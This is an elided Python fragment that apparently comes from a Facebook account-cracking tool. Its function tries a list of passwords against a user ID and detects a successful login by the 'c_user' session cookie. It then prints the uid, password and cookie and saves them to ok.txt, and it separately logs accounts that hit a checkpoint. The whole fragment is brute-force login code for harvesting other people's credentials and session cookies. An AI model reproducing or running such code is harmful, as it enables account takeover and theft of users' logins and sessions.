...
def apii(uid, pwx):
	...
	for pw in pwx:
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			______DICKYXD______("\r %s[TONU-OK] %s • %s • %s          "%(H,uid, pw,coki))

			cek_apk(coki)

			ok.append("%s • %s"%(uid, pw))

			open("ok.txt","a").write(" [TONU-OK] %s • %s • %s \n"%(uid, pw,coki))
			...
			try:
				...
				______DICKYXD______("\r %s\x1b[1;93m[TONU-CP] %s • %s • %s %s %s"%(K,uid, pw, day, month, year))
